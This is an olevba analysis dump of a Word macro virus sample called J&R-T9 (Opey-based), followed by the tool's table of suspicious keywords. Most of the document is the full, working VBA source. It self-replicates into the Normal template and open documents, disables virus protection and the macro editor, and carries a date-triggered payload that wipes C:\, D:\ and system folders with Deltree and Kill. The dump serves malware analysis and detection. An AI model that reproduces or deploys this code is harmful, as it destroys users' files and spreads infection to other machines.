olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-5f5dc651146c6f4817cdbf67ad2369c4b47de727
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-5f5dc651146c6f4817cdbf67ad2369c4b47de727 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JR_T9.bas 
in file: Virus.MSWord.Opey-based-5f5dc651146c6f4817cdbf67ad2369c4b47de727 - OLE stream: 'Macros/VBA/JR_T9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Macro virus J&R-T9
'This a gift for my love
'Written by NcT-JR_T9!!!
'Date : 19/08/1999
'I hope You like it !!
Public Declare Function WinExec Lib "kernel32" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub Killer()
    DateKill = Mid(Date, 3, 2)
    Call KillD
        Temp$ = String$(255, 0)              ' Size Buffer
        x = GetWindowsDirectory(Temp$, 255)  ' Make API Call
        Temp$ = Left$(Temp$, x)              ' Trim Buffer
        MsgBox "Don't challenge me !!! Heheheheh !!!", vbOKOnly + vbInformation, "Warning from T9999T :-("
        On Error Resume Next
        WinExec Temp$ + "\RUNDLL.EXE user.exe,exitwindows", 0
        Application.Quit 0, 0, 0
End Sub
Sub VrInit()
   Set Ad = ActiveDocument
   Set nt = NormalTemplate
   TotalMacAd = Ad.VBProject.VBComponents.Count
   For i = 1 To TotalMacAd
     NMacr = Ad.VBProject.VBComponents(i).Name
     If (NMacr <> "JR_T9") And (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
       Application.OrganizerDelete Source:=Ad.FullName, Name:=NMacr, Object:=wdOrganizerObjectProjectItems
     End If
   Next i
   TotalMacNT = nt.VBProject.VBComponents.Count
   For i = 1 To TotalMacNT
     NMacr = nt.VBProject.VBComponents(i).Name
     If (NMacr <> "JR_T9") And (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
       Application.OrganizerDelete Source:=nt.FullName, Name:=NMacr, Object:=wdOrganizerObjectProjectItems
     End If
   Next i
End Sub
Sub ForYou()
    On Error Resume Next
    Call VrInit
    On Error Resume Next
    Call JR_T9
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "JR_T9" Then NTInfected = True
                If (clan <> "JR_T9") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "JR_T9" Then ODInfected = True
                    If (clan <> "JR_T9") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="JR_T9", Object:=wdOrganizerObjectProjectItems
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="JR_T9", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
End Sub
Sub JR_T9()
    On Error Resume Next
    Application.UserName = "¡Jack! & ¡Rose! - T9999T :-("
    Application.UserAddress = "ncaotri@yahoo.com" + Chr(13) + "I love you. I miss you so much....!!!"
    Application.UserInitials = ":-)"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = ";-) JR_T9 ;-("
        .Title = "Kiss you Rose xxx"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("Tools").Controls("Customize...").Enabled = False
    CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
    CommandBars("View").Controls("Toolbars").Enabled = False
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub KillD()
    Temp$ = String$(255, 0)              ' Size Buffer
    x = GetWindowsDirectory(Temp$, 255)  ' Make API Call
    Temp$ = Left$(Temp$, x)              ' Trim Buffer
    On Error Resume Next
    WinExec Temp$ + "\Command\Deltree.exe /y D:\My Documents", 0
    On Error Resume Next
    WinExec Temp$ + "\Command\Deltree.exe /y C:\", 0
    On Error Resume Next
    WinExec Temp$ + "\Command\Deltree.exe /y D:\", 0
    '----------
    On Error Resume Next
    Kill Options.DefaultFilePath(wdDocumentsPath) + "\*.*"
    On Error Resume Next
    Kill Options.DefaultFilePath(wdProgramPath) + "\*.*"
    On Error Resume Next
    Kill Temp$ + "\*.*"
    On Error Resume Next
    Kill Temp$ + "\Systems\*.*"
    On Error Resume Next
    Kill Temp$ + "\Fonts\*.*"
    On Error Resume Next
    Kill "C:\*.*"
End Sub
Sub HelpAbout()
 If Application.UserName = "T9999T" Then
    On Error GoTo Erw
    MsgBox "Chªo chï nh¡n cïa t¤i. MÀy ¢ang bÜ virus ¢Êy !", vbInformation, "Th¤ng bÀo"
 Else
    Application.Caption = "NcT-T9999T Heheheheh !"
    Application.Dialogs(wdDialogHelpAbout).Show
 End If
Erw:
    Application.Caption = "Microsoft Word"
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call ForYou
    ActiveDocument.Save
End Sub
Sub AutoExec()
    On Error Resume Next
    Call ForYou
    ActiveDocument.Save
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call ForYou
End Sub
Sub FileOpen()
    Dialogs(wdDialogFileOpen).Show
    On Error Resume Next
    Call ForYou
    If Val(DateKill) > 22 Then
      Call Killer
    End If
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call ForYou
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileClose()
    On Error Resume Next
    Call ForYou
    If Val(DateKill) > 22 Then
      Call Killer
    End If
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call ForYou
    If Val(DateKill) > 22 Then
      Call Killer
    End If
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoClose()
    On Error Resume Next
    Call ForYou
    ActiveDocument.Close
End Sub
Sub AutoExit()
    On Error Resume Next
    Call ForYou
    If Val(DateKill) > 22 Then
      Call Killer
    End If
    On Error Resume Next
    Call ForYou
    Application.Quit
End Sub
Sub ToolsMacro()
    Call Killer
End Sub
Sub ViewVBCode()
    Call Killer
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
|IOC       |Deltree.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

